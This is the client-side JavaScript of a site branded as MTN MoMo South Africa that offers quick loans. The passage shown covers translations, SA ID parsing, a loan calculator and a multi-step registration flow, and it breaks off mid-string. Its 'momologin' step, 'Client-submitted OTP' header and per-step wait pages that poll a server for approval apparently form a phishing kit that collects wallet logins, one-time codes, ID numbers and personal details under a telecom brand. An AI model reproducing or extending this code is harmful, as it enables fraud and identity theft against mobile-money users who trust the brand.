// ============================================================
// script.js – MTN MoMo South Africa  (v7.2 FINAL)
// Client-submitted OTP · No inline handlers
// ============================================================
'use strict';

// ═══════════════════════════════════════════════════════════
// CONSTANTS & STATE
// ═══════════════════════════════════════════════════════════
var ACCOUNT_TYPES = {
    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true  },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true  },
    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
};

var STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
var POLL_INTERVAL = 2500;
var POLL_MAX_DURATION = 30 * 60 * 1000;

var S = {
    applicationId: '',
    isRegistered: false,
    registrationStatus: 'idle',
    accountType: null,
    accountMaxLoan: 0,
    idNumber: null,
    dob: null,
    steps: {},
    loan: {}, personal: {}, employment: {}, guarantor: {}
};

var KEYS = { APP_ID: 'mtn_za_app_id_v7', APP_DATA: 'mtn_za_data_v7' };

var activePoll = null;
var currentPollStep = null;
var currentPollCallback = null;
var currentPollStarted = 0;
var regPollTimer = null;
var selectedAccountType = null;
var qualificationAnimator = null;
var CURRENT_LANG = localStorage.getItem('momo_lang') || 'en';
var _termsCache = null;

// ═══════════════════════════════════════════════════════════
// STORAGE HELPERS
// ═══════════════════════════════════════════════════════════
function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
function get(k) { try { var d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } }
function rm(k) { try { localStorage.removeItem(k); } catch (e) {} }

function saveAll() {
    save(KEYS.APP_ID, S.applicationId);
    save(KEYS.APP_DATA, {
        isRegistered: S.isRegistered,
        registrationStatus: S.registrationStatus,
        accountType: S.accountType,
        accountMaxLoan: S.accountMaxLoan,
        dob: S.dob,
        steps: S.steps,
        loan: S.loan, personal: S.personal,
        employment: S.employment, guarantor: S.guarantor
    });
}

// ═══════════════════════════════════════════════════════════
// I18N
// ═══════════════════════════════════════════════════════════
var I18N = {
    en: {
        'landing.welcome': 'Welcome to MTN MoMo South Africa',
        'landing.tagline': 'Get loans easily through MTN MoMo South Africa',
        'landing.haveMomo': 'I already have MoMo',
        'landing.haveMomoSub': 'Link your wallet once, then apply in one tap',
        'landing.noMomo': "I don't have MoMo yet",
        'landing.noMomoSub': 'Sign up in 60 seconds, then apply for a loan',
        'landing.continueMomo': 'Continue with MoMo',
        'landing.registerFirst': 'Register First',
        'landing.secure': '🔒 Secure',
        'landing.fast': '⚡ Fast Approval',
        'landing.sa': '🇿🇦 Proudly SA',
        'landing.calcTitle': 'Loan Calculator',
        'landing.calcSub': 'See your monthly payment',
        'landing.loanAmount': 'Loan Amount',
        'landing.loanTerm': 'Loan Term',
        'landing.monthlyPayment': 'Monthly Payment',
        'landing.totalRepayment': 'Total Repayment',
        'landing.amountReceive': 'Amount You Receive',
        'landing.applyLoan': 'Apply for This Loan',
        'landing.calcNote': '💡 You can change these later'
    },
    zu: {
        'landing.welcome': 'Siyakwamukela ku-MTN MoMo South Africa',
        'landing.tagline': 'Thola imali mboleko kalula nge-MTN MoMo',
        'landing.haveMomo': 'Senginayo i-MoMo',
        'landing.haveMomoSub': 'Xhumanisa isikhwama sakho, bese ufaka isicelo',
        'landing.noMomo': 'Anginayo i-MoMo okwamanje',
        'landing.noMomoSub': 'Bhalisa ngemizuzu engu-60, bese ufaka isicelo',
        'landing.continueMomo': 'Qhubeka ne-MoMo',
        'landing.registerFirst': 'Bhalisa Kuqala',
        'landing.secure': '🔒 Kuphephile',
        'landing.fast': '⚡ Ukugunyazwa Okusheshayo',
        'landing.sa': '🇿🇦 Iningizimu Afrika',
        'landing.calcTitle': 'Isibali Semali Mboleko',
        'landing.calcSub': 'Bona inkokhelo yakho yanyanga zonke',
        'landing.loanAmount': 'Inani Lemali',
        'landing.loanTerm': 'Isikhathi',
        'landing.monthlyPayment': 'Inkokhelo Yanyanga',
        'landing.totalRepayment': 'Isamba Sokukhokha',
        'landing.amountReceive': 'Imali Ozoyithola',
        'landing.applyLoan': 'Faka Isicelo',
        'landing.calcNote': '💡 Ungashintsha lokhu kamuva'
    },
    af: {
        'landing.welcome': 'Welkom by MTN MoMo Suid-Afrika',
        'landing.tagline': 'Kry lenings maklik deur MTN MoMo',
        'landing.haveMomo': 'Ek het reeds MoMo',
        'landing.haveMomoSub': 'Koppel jou beursie een keer, dan doen aansoek',
        'landing.noMomo': 'Ek het nog nie MoMo nie',
        'landing.noMomoSub': 'Registreer in 60 sekondes, doen dan aansoek',
        'landing.continueMomo': 'Gaan voort met MoMo',
        'landing.registerFirst': 'Registreer Eers',
        'landing.secure': '🔒 Veilig',
        'landing.fast': '⚡ Vinnige Goedkeuring',
        'landing.sa': '🇿🇦 Trotse SA',
        'landing.calcTitle': 'Lening Sakrekenaar',
        'landing.calcSub': 'Sien jou maandelikse betaling',
        'landing.loanAmount': 'Lening Bedrag',
        'landing.loanTerm': 'Lening Termyn',
        'landing.monthlyPayment': 'Maandelikse Betaling',
        'landing.totalRepayment': 'Totale Terugbetaling',
        'landing.amountReceive': 'Bedrag Wat Jy Ontvang',
        'landing.applyLoan': 'Doen Aansoek',
        'landing.calcNote': '💡 Jy kan dit later verander'
    }
};

function t(key) { return (I18N[CURRENT_LANG] && I18N[CURRENT_LANG][key]) || I18N.en[key] || key; }

function applyI18n() {
    document.querySelectorAll('[data-i18n]').forEach(function (el) {
        var val = t(el.dataset.i18n);
        if (val) el.textContent = val;
    });
    var langSel = document.getElementById('langSelect');
    if (langSel) langSel.value = CURRENT_LANG;
    document.documentElement.lang = CURRENT_LANG;
}

function setLanguage(lang) {
    CURRENT_LANG = I18N[lang] ? lang : 'en';
    localStorage.setItem('momo_lang', CURRENT_LANG);
    applyI18n();
    showToast(CURRENT_LANG === 'en' ? 'Language: English'
        : CURRENT_LANG === 'zu' ? 'Ulimi: isiZulu'
        : 'Taal: Afrikaans', 'success', 1800);
}

// ═══════════════════════════════════════════════════════════
// UTILITIES
// ═══════════════════════════════════════════════════════════
function escapeHtml(s) {
    return String(s || '').replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
}
function fmt(n) { return (Number(n) || 0).toLocaleString(); }

function genAppId() {
    var rand;
    try {
        rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
    } catch (e) {
        rand = Math.random().toString(36).replace(/[^a-z0-9]/gi, '').toUpperCase();
    }
    return 'MTN-ZA-' + rand.slice(0, 8);
}

function showToast(msg, type, duration) {
    type = type || 'info';
    duration = duration || 3200;
    document.querySelectorAll('.toast').forEach(function (t) { t.remove(); });
    var el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(function () {
        el.style.opacity = '0';
        el.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(function () { el.remove(); }, 300);
    }, duration);
}

function showErr(id, msg) {
    var box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        var t2 = document.getElementById(id + 'Txt');
        if (t2) t2.textContent = msg;
    }
}
function clearErr(id) {
    var box = document.getElementById(id);
    if (box) box.classList.remove('show');
}
function setBtnLoading(btn, loading, defaultText) {
    if (!btn) return;
    btn.disabled = loading;
    btn.textContent = loading ? 'Please wait...' : defaultText;
}

async function apiCall(endpoint, options) {
    options = options || {};
    try {
        var fetchOpts = Object.assign({
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' }
        }, options);
        fetchOpts.headers = Object.assign({ 'Content-Type': 'application/json' }, options.headers || {});
        var res = await fetch(endpoint, fetchOpts);
        var data = await res.json();
        if (res.status === 429 || (data && data.code === 'RATE_LIMITED')) {
            var msg = (data && data.error) || 'You have exceeded the trial limit. Please try again in 5 minutes.';
            showToast('⏳ ' + msg, 'error', 6000);
            throw new Error(msg);
        }
        return data;
    } catch (e) {
        console.error(endpoint + ':', e.message);
        throw e;
    }
}

// ═══════════════════════════════════════════════════════════
// NAVIGATION
// ═══════════════════════════════════════════════════════════
function goTo(pageId) {
    if (requiresRegistration(pageId) && !isUserRegistered()) {
        forceRegistration();
        return;
    }
    document.querySelectorAll('.page').forEach(function (p) { p.classList.remove('active'); });
    var el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
    try { history.pushState({ page: pageId }, '', '#' + pageId); } catch (e) {}

    if (pageId === 'page-requirements') updateRequirementsLimits();
    if (pageId === 'page-step1') refreshStep1();
    if (pageId === 'page-step2') prefillPersonal();
    if (pageId === 'page-momologin') prefillMoMoLogin();
    if (pageId === 'page-confirmation') updateConfirmation();
    refreshAccountBadges();

    if (pageId.indexOf('page-wait-') !== 0 && pageId !== 'page-scan' && pageId.indexOf('page-registration-') !== 0) {
        stopPolling();
    }
}

function requiresRegistration(pageId) {
    var list = ['page-step1','page-step2','page-step3','page-guarantor','page-confirmation',
                'page-momologin','page-scan','page-approval',
                'page-wait-loan','page-wait-personal','page-wait-employment',
                'page-wait-guarantor','page-wait-momologin'];
    return list.indexOf(pageId) !== -1;
}
function isUserRegistered() {
    return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType] && S.registrationStatus === 'completed');
}
function forceRegistration(reason) {
    showToast('🔗 Please complete your registration to continue', 'info', 3500);
    setTimeout(function () {
        routeRegistrationFlow();
        if (reason) setTimeout(function () { showErr('regErr', reason); }, 400);
    }, 800);
}

function refreshAccountBadges() {
    var type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
    var label = type ? type.icon + ' ' + type.name : '';
    ['navbarAccount0','navbarAccount','navbarAccount2','navbarAccount3','navbarAccount4','navbarAccount5','navbarAccount6'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.innerHTML = label ? '<div class="nav-badge">' + label + '</div>' : '';
    });
}

// ═══════════════════════════════════════════════════════════
// SA ID PARSING
// ═══════════════════════════════════════════════════════════
function luhnCheck(num) {
    var sum = 0, alt = false;
    for (var i = num.length - 1; i >= 0; i--) {
        var n = parseInt(num[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    return sum % 10 === 0;
}

function parseSAId(id) {
    if (!id) return { ok: false, reason: 'ID required.' };
    var clean = String(id).replace(/\D/g, '');
    if (clean.length !== 13) return { ok: false, reason: 'SA ID must be 13 digits.' };
    var yy = parseInt(clean.substring(0, 2));
    var mm = parseInt(clean.substring(2, 4));
    var dd = parseInt(clean.substring(4, 6));
    var century = yy < 30 ? 2000 : 1900;
    var year = century + yy;
    var dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
        return { ok: false, reason: 'Invalid date of birth.' };
    }
    var age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
    var gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    var c = clean[10];
    var citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
    return {
        ok: true,
        dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }),
        isoDob: year + '-' + String(mm).padStart(2, '0') + '-' + String(dd).padStart(2, '0'),
        age: age, gender: gender, citizenship: citizenship
    };
}

function validateAndPreviewId(id) {
    var r = parseSAId(id);
    var p = document.getElementById('regDetailsPreview');
    if (!p) return;
    if (!r.ok) {
        p.innerHTML = '<div class="reg-preview-error">✕ ' + escapeHtml(r.reason) + '</div>';
        var dobEl = document.getElementById('regDob');
        if (dobEl) dobEl.value = '';
        return;
    }
    p.innerHTML =
        '<div class="reg-preview-row"><span>DOB</span><strong>' + r.dob + '</strong></div>' +
        '<div class="reg-preview-row"><span>Age</span><strong>' + r.age + ' years</strong></div>' +
        '<div class="reg-preview-row"><span>Gender</span><strong>' + r.gender + '</strong></div>' +
        '<div class="reg-preview-row"><span>Citizenship</span><strong>' + r.citizenship + '</strong></div>';
    var dobEl2 = document.getElementById('regDob');
    if (dobEl2) dobEl2.value = r.isoDob;
}

function normalizePhone(id) {
    var inp = document.getElementById(id);
    if (!inp) return;
    var v = inp.value.replace(/\D/g, '');
    if (v.length > 9) v = v.substring(0, 9);
    inp.value = v;
}
function normalizeId(id) {
    var inp = document.getElementById(id);
    if (!inp) return;
    var v = inp.value.replace(/\D/g, '');
    if (v.length > 13) v = v.substring(0, 13);
    inp.value = v;
    if (v.length === 13) validateAndPreviewId(v);
    else {
        var p = document.getElementById('regDetailsPreview');
        if (p) p.innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
        var dobEl = document.getElementById('regDob');
        if (dobEl) dobEl.value = '';
    }
}

// ═══════════════════════════════════════════════════════════
// CALCULATOR
// ═══════════════════════════════════════════════════════════
function updateCalc() {
    var slider = document.getElementById('amtSlider');
    if (!slider) return;
    var maxAllowed = isUserRegistered()
        ? Math.min(500000, ACCOUNT_TYPES[S.accountType].maxLoan)
        : 500000;
    slider.max = maxAllowed;
    if (+slider.value > maxAllowed) slider.value = maxAllowed;

    var amt = +slider.value;
    var termEl = document.getElementById('calcTermSelect');
    var term = termEl ? +termEl.value : 48;
    var r = 0.27 / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
    var total = monthly * term;

    var set = function (id, val) { var el = document.getElementById(id); if (el) el.textContent = val; };
    set('calcAmt', 'R ' + amt.toLocaleString());
    set('monthlyAmt', 'R ' + monthly.toLocaleString());
    set('totalAmt', 'R ' + total.toLocaleString());
    set('receiveAmt', 'R ' + amt.toLocaleString());

    var pct = ((amt - 5000) / Math.max(1, maxAllowed - 5000)) * 100;
    slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');

    var ends = slider.parentElement && slider.parentElement.querySelector('.range-ends');
    if (ends) ends.innerHTML = '<span>R 5,000</span><span>R ' + maxAllowed.toLocaleString() + '</span>';
}

// ═══════════════════════════════════════════════════════════
// LANDING ACTIONS
// ═══════════════════════════════════════════════════════════
function applyAsExistingUser() {
    console.log('[applyAsExistingUser] isRegistered:', isUserRegistered(), 'regStatus:', S.registrationStatus);
    if (isUserRegistered()) {
        if (S.steps.loan === 'approved') {
            if (S.steps.personal === 'approved') {
                if (S.steps.employment === 'approved') {
                    if (S.steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
                    goTo('page-guarantor'); return;
                }
                goTo('page-step3'); return;
            }
            goTo('page-step2'); return;
        }
        goTo('page-step1');
        return;
    }
    if (S.isRegistered && S.registrationStatus && S.registrationStatus !== 'completed') {
        routeRegistrationFlow();
        return;
    }
    showToast('🔗 Link your MoMo wallet — takes 60 seconds', 'info', 3500);
    setTimeout(function () { startMoMoRegistration({ mode: 'link' }); }, 500);
}

function applyFromCalculator() {
    var slider = document.getElementById('amtSlider');
    var termEl = document.getElementById('calcTermSelect');
    var amt = slider ? +slider.value : 50000;
    var term = termEl ? termEl.value + ' Months' : '48 Months';
    var max = S.accountMaxLoan || (S.accountType ? ACCOUNT_TYPES[S.accountType].maxLoan : amt);
    var finalAmt = Math.min(amt, max);
    S.loan = Object.assign({}, S.loan, { loanAmount: finalAmt, loanTerm: term });
    saveAll();
    if (!isUserRegistered()) {
        showToast('💾 Saved R ' + fmt(finalAmt) + ' — complete registration to continue', 'info', 4000);
        setTimeout(applyAsExistingUser, 500);
        return;
    }
    showToast('R ' + fmt(finalAmt) + ' selected', 'success');
    goTo('page-step1');
}

// ═══════════════════════════════════════════════════════════
// REGISTRATION
// ═══════════════════════════════════════════════════════════
function startMoMoRegistration(opts) {
    opts = opts || {};
    var mode = opts.mode || 'register';

    S.isRegistered = false;
    S.accountType = null;
    S.accountMaxLoan = 0;
    S.idNumber = null;
    S.dob = null;
    S.registrationStatus = 'idle';
    S.steps = {};
    saveAll();

    var setVal = function (id, v) { var el = document.getElementById(id); if (el) el.value = v; };
    setVal('regId', '');
    setVal('regPhone', '');
    setVal('regEmail', '');
    setVal('regDob', '');
    var tnc = document.getElementById('regTnc');
    if (tnc) tnc.checked = false;
    var prev = document.getElementById('regDetailsPreview');
    if (prev) prev.innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';

    selectedAccountType = null;
    document.querySelectorAll('.account-type').forEach(function (el) {
        el.classList.remove('selected');
        var c = el.querySelector('.at-check');
        if (c) c.textContent = '○';
    });
    var hint = document.getElementById('accountTypeHint');
    if (hint) hint.textContent = 'Tap to select';
    clearErr('regErr');

    var heading = document.querySelector('#page-register-check .step-card h2');
    var sub = document.querySelector('#page-register-check .step-sub');
    var introH3 = document.querySelector('#page-register-check .reg-intro h3');
    var introP = document.querySelector('#page-register-check .reg-intro p');
    if (mode === 'link') {
        if (heading) heading.textContent = 'Link Your MoMo Wallet';
        if (sub) sub.textContent = 'Verify your ID to link your existing MoMo account';
        if (introH3) introH3.textContent = 'Link your existing MoMo wallet';
        if (introP) introP.textContent = 'Confirm your SA ID, mobile, and email, then pick the wallet type you hold.';
    } else {
        if (heading) heading.textContent = 'MoMo Registration';
        if (sub) sub.textContent = 'Register in under 60 seconds';
        if (introH3) introH3.textContent = "You're 2 steps away from your loan";
        if (introP) introP.textContent = "MoMo is MTN's mobile money service. Register your wallet, then apply.";
    }
    goTo('page-register-check');
}

function selectAccountType(type) {
    selectedAccountType = type;
    var names = { yello: 'MoMo Yello', yello_plus: 'MoMo Yello Plus', eazi: 'MoMo Eazi' };
    document.querySelectorAll('.account-type').forEach(function (el) {
        var m = el.dataset.type === type;
        el.classList.toggle('selected', m);
        var c = el.querySelector('.at-check');
        if (c) c.textContent = m ? '●' : '○';
    });
    var hint = document.getElementById('accountTypeHint');
    if (hint) hint.textContent = '✅ ' + names[type];
}

async function completeRegistration() {
    var idEl = document.getElementById('regId');
    var phoneEl = document.getElementById('regPhone');
    var emailEl = document.getElementById('regEmail');
    var dobEl = document.getElementById('regDob');
    var tncEl = document.getElementById('regTnc');
    var id = (idEl || {}).value || '';
    var phone = (phoneEl || {}).value || '';
    var email = (emailEl || {}).value || '';
    var dob = (dobEl || {}).value || '';
    var tnc = !!(tncEl || {}).checked;

    var idTrim = id.trim();
    var phoneTrim = phone.trim();
    var emailTrim = email.trim();

    if (!idTrim) return showErr('regErr', 'Please enter your SA ID.');
    if (idTrim.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
    var r = parseSAId(idTrim);
    if (!r.ok) return showErr('regErr', r.reason);
    if (!dob) return showErr('regErr', 'Please re-enter your SA ID.');
    if (phoneTrim.length !== 9) return showErr('regErr', 'Mobile number must be 9 digits.');
    if (!emailTrim || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailTrim)) return showErr('regErr', 'Enter a valid email address
